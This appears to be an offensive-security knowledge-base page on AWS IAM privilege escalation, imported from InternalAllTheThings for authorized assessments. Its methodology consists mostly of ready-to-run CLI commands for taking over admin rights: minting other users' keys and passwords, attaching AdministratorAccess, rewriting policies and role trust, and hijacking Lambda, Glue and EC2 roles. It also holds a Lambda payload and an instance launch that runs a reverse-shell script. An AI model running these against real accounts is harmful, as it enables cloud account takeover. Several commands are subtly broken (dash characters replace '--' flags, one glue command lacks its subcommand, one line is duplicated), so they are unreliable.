---
title: AWS - Identity & Access Management
type: technique
tags: [aws, cloud, credentials, iam, privilege-escalation, reference-import]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# AWS - Identity & Access Management

## What it is

Technical reference for **AWS - Identity & Access Management** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

AWS IAM controls access to every AWS service through policies attached to users, groups, and roles; overly broad policies such as `*:*` or wildcard resource ARNs are common and grant unintended privilege. Attackers with IAM enumeration rights can list all policies, inline policies, and role trust relationships to map which identities can assume which roles, then escalate by assuming a more privileged role or by attaching an admin policy to their own user. Privilege escalation via IAM exploits the gap between a user's effective permissions and the minimum necessary permissions for their role.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Listing IAM access Keys

```ps1
aws iam list-access-keys
```

## Listing IAM Users and Groups

```ps1
aws iam list-users
aws iam list-groups
```

## Get IAM Details

```ps1
aws iam get-account-authorization-details > iam.json
```

## Assume a Specific Role

```ps1
aws sts assume-role --role-arn arn:aws:iam::${accountId}:role/${roleName} --role-session-name ${roleName}
```

## Login with MFA

Retrieve the MFA device ARN:

```ps1
aws iam list-mfa-devices
```

Then create the session token:

```ps1
aws sts get-session-token --serial-number ${arnMFADevice} --token-code ${MFACode}
```

## Shadow Admin

### Admin equivalent permission

- AdministratorAccess

```powershell
"Action": "*"
"Resource": "*"
```

- **ec2:AssociateIamInstanceProfile** : attach an IAM instance profile to an EC2 instance

```powershell
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789
```

- **iam:CreateAccessKey** : create a new access key to another IAM admin account

```powershell
aws iam create-access-key –user-name target_user
```

- **iam:CreateLoginProfile** : add a new password-based login profile, set a new password for an entity and impersonate it

```powershell
aws iam create-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
```

- **iam:UpdateLoginProfile** : reset other IAM users’ login passwords.

```powershell
aws iam update-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
```

- **iam:AttachUserPolicy**, **iam:AttachGroupPolicy** or **iam:AttachRolePolicy** : attach existing admin policy to any other entity he currently possesses

```powershell
aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

- **iam:PutUserPolicy**, **iam:PutGroupPolicy** or **iam:PutRolePolicy** : added inline policy will allow the attacker to grant additional privileges to previously compromised entities.

```powershell
aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json
```

- **iam:CreatePolicy** : add a stealthy admin policy
- **iam:AddUserToGroup** : add into the admin group of the organization.

```powershell
aws iam add-user-to-group –group-name target_group –user-name my_username
```

- **iam:UpdateAssumeRolePolicy** + **sts:AssumeRole** : change the assuming permissions of a privileged role and then assume it with a non-privileged account.

```powershell
aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json
```

- **iam:CreatePolicyVersion** & **iam:SetDefaultPolicyVersion** : change customer-managed policies and change a non-privileged entity to be a privileged one.

```powershell
aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default
aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2
```

- **lambda:UpdateFunctionCode** : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.

```powershell
aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip
```

- **glue:UpdateDevEndpoint** : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint.

```powershell
aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub
```

- **iam:PassRole** + **ec2:CreateInstanceProfile**/**ec2:AddRoleToInstanceProfile** : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.

- **iam:PassRole** + **ec2:RunInstance** : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.

```powershell
# add ssh key
$ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456
# execute a reverse shell
$ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh
```

- **iam:PassRole** + **lambda:CreateFunction** + **lambda:InvokeFunction** : give a user access to the privileges associated with any Lambda service role that exists in the account.

```powershell
aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py
aws lambda invoke –function-name my_function output.txt
```

    Example of code.py

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
    UserName='my_username',
    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

- **iam:PassRole** + **glue:CreateDevEndpoint** : access to the privileges associated with any Glue service role that exists in the account.

```powershell
aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub
```

## References

- [Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk](https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
